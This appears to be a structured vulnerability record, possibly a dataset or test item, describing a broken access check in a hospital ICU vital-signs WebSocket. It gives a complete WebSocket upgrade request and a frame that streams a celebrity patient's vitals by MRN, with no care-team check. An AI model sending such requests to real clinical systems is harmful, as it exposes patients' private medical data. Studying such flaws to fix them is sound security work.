diagnosis: The bedside vital signs telemetry WebSocket validates that the connecting practitioner has a valid hospital staff JWT, but binds the live change stream to any patient MRN supplied in the client frame without checking whether the clinician is assigned to that patient's ward or care team.
exploit_request:
GET /vitals HTTP/1.1
Host: icu-telemetry.healthcorp.lan:8004
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: <physician_jwt>
Sec-WebSocket-Key: kf8h7V1gC8d4H==
Sec-WebSocket-Version: 13

[WebSocket Frame]: {"command":"STREAM_VITALS","mrn":"MRN-VIP-CELEBRITY-99"}
